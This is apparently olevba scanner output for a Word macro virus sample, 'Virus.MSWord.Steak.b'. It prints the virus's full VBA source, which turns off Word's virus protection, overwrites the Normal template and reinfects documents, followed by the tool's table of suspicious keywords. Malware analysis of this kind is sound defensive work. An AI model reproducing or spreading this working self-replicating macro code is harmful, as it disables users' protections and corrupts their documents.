olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Steak.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Steak.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Options.VirusProtection = (0 - 0): Options.ConfirmConversions = (1 - 1): Options.SaveNormalPrompt = (2 - 2)
ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\A1.sys"
Set A1 = NormalTemplate.VBProject.VBComponents.Item(1)
A1.Codemodule.Deletelines 1, A1.Codemodule.CountOfLines
Open "c:\A1.inf" For Output As #1
Print #1, "Private Sub Document_Open()"
Print #1, "Set A1 = ActiveDocument.VBProject.VBComponents.Item(1)"
Print #1, "A1.Codemodule.Deletelines 1, A1.Codemodule.CountOfLines"
Print #1, "A1.Codemodule.AddFromFile (" & Chr(34) & "c:\A1.sys" & Chr(34) & ")"
Print #1, "A1.Codemodule.Deletelines 1, 4"
Print #1, "End Sub"
Close #1
A1.Codemodule.AddFromFile ("c:\A1.inf")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
'*.,.*.,.*.,.*.,.*.,.*.,.*.,.*.,.*.,.*'
'*~~A.1.~Steak~Sauce:~By~Lys~KovicK~~*'
'*~~~~~~~(Phixed~Publik~Kopie)~~~~~~~*'
'*;*;*;*;*;*;*;*;*;*;*;*;*;*;*;*;*;*;*'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |A1.inf              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

